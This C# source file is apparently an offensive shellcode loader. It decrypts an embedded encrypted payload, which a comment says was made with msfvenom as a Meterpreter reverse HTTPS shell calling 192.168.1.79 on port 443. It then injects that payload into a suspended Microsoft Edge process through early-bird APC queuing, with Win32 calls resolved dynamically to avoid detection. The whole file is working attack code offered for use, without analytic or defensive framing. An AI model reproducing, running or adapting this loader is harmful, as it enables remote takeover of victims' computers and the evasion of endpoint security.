using System;
using System.Runtime.InteropServices;

namespace DynamicInvoke
{
    public static class Program
    {
        // spawn MSEdge
        public static string ProcessToSpawn = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        public static string ProcessArgs = "--profile-directory=Default";
        public static string startDir = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application";

        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.79 LPORT=443 -f csharp
            string shellkey = "YjA5MmU1Yjc0MjZiZGE1Njg3Nzk0NTlkY2U5NWNlZjQ=";
            string shellcode = "pSLC0b2FmTFZaiJhDDoIOBJ2l2crIuxhLjLgYlYc5zl5f2T8Btw8PBJl5ncTInD14VE0TVtGQ3GMo1coW4an3Bwi7GFu8SkMBlW8KghU1E1WXExj3xhRPVnhwb1NbVV53KoXVwVrii3RB2V4T7rse1YqiGYDZaUjpvsUvnrfBm2MImD99SuA/EAsVPBhihbBAWkWTVICfOA7sj93xTpPeU+ECirSPh1xxRdSJVu6ELZd4gBtBWyFcAE0OmoMMhswGx0NsqJKJmGxmjNxFw4k4EvbHsqxqBMka7ECdOcdKFskAzBFWSs1eMSLE66YCzIXSZWyYB0y4tEdDiFamX9k/B0EB9ZgPCiaWWpBNbK4vTxZamMBdFh0WGx/awBgXV4zFDLi8QeTrNBYMlV4f54dPzBpAnTjPciqi21VMVmVttjyalppdTEiAwgpDFkqOApnDAIlKQ4HFGotOjkKGywXVx4gdVh4CGJ9DT0vAWAnPSNqJAN/KjkUbCwzWH0lDRQhEHA8TQkPFgEABDluEjokdj45El8APC1pOgMMJm0AaFMEEARlCUkTARguIkYYWwZdLy4JJG04NFAKKyh/EgJlRTYkEQc8XW8mGx4AATovC1kpHzlvAyU+DxMfJnghECJddw0ac20fI0UMGzMDEiAKaHoePQYzCXZydl8yZX4eAAQbGmwj0PMGbw8PA12TORmFWVjpsU1tVTEJOTB5iqixPHR8uuQG46FZRCUjub8+czELWtUGTlcH5boAVXwAI/tAC/PTMVlqY8+YJ2upCR0NuL8nVvoDS6JjHR2rqXQ0TU6xgsusL3UZ+pjiUjVNJO91qV+DME1qWpaPD7r+OmiMmaYvazBOBzUBGWgcvJ+WrHwTrZE9SWpBfPc18WK8amMwTZWPIckUFnnHjS+6vzLi6geTrGt5MlV8x64H1kj82N9ZakE1srgdsp1K5vA52DziXQ9E8suqEuEWuTNaTg0lrJvC4JcYqJs=";

            // decrypt the shellcode
            byte[] buf = Encrypt.Decrypt(shellcode, shellkey);

            
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
            IntPtr pointer;

            // create the delegate references
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            DELEGATES.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            DELEGATES.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            DELEGATES.VirtualProtectEx VirtualProtectEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            DELEGATES.QueueUserAPC QueueUserAPC = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            // dynamically invoke the Win32 APIs
#if DEBUG
            Console.WriteLine("[*] (DInvoke) CreateProcess");
#endif
            STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
            STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();

            bool result = CreateProcess(ProcessToSpawn, ProcessArgs, ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_NEW_CONSOLE | STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, startDir, ref si, out pi);

#if DEBUG
            Console.WriteLine("[*] Process ID: {0}", pi.dwProcessId);
            Console.WriteLine("[*] Thread ID: {0}", pi.dwThreadId);
            Console.WriteLine("[*] (DInvoke) VirtualAllocEx");
#endif
            IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x04);
#if DEBUG
            Console.WriteLine("[*] Address: 0x{0}", addr.ToString("X"));
            Console.WriteLine("[*] Protection: PAGE_READWRITE");
            Console.WriteLine("[*] (DInvoke) WriteProcessMemory");
#endif
            WriteProcessMemory(pi.hProcess, addr, buf, buf.Length, out IntPtr bytesWritten);
#if DEBUG
            Console.WriteLine("[*] Written to Address: 0x{0}", addr.ToString("X"));

            Console.WriteLine("[*] (DInvoke) VirtualProtectEx");
#endif
            VirtualProtectEx(pi.hProcess, addr, buf.Length, 0x20, out uint p);
#if DEBUG
            Console.WriteLine("[*] Protection: PAGE_EXECUTE_READ");
            Console.WriteLine("[*] (DInvoke) QueueUserAPC");
#endif
            QueueUserAPC(addr, pi.hThread, IntPtr.Zero);

#if DEBUG
            Console.WriteLine("[*] (DInvoke) ResumeThread: 0x{0}", pi.hThread.ToString("X"));
#endif
            ResumeThread(pi.hThread);
#if DEBUG
            Console.WriteLine("[*] We should have shellcode execution...");
            Console.ReadKey();
#endif
        }
    }
}
